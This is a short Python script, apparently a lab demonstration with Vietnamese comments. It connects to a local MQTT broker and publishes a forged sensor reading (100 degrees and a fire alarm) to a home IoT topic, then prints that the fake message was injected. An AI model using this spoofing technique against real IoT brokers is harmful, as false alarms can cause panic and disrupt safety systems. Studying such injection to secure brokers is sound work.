import paho.mqtt.client as mqtt
import json

client = mqtt.Client("Hacker_Device")
client.connect("127.0.0.1", 1883)

# Gửi tin nhắn giả mạo với nội dung cực đoan
fake_data = json.dumps({"nhiet_do": 100, "canh_bao": "CHÁY RỒI! CHÁY RỒI!"})
client.publish("iot/home/sensor1", fake_data) 
print("Đã chèn tin nhắn giả mạo!")
client.disconnect()